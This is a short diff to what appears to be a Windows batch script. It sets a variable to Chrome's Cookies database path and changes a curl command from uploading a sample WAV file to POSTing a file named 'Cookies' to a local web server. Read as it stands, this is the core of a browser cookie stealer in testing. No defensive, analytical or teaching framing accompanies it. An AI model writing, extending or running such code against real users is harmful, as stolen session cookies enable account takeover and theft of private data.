@@ -1,2 +1,2 @@
 set path = %AppData%\..\Local\Google\Chrome\User Data\Default\Network\Cookies
-curl --header "multipart/form-data" -X  POST -F 'file=@"C:\Users\yoni9\Downloads\file_example_WAV_1MG.wav" http://localhost:80/
+curl  -X  POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\yoni9\OneDrive\Cookies" http://localhost:80/
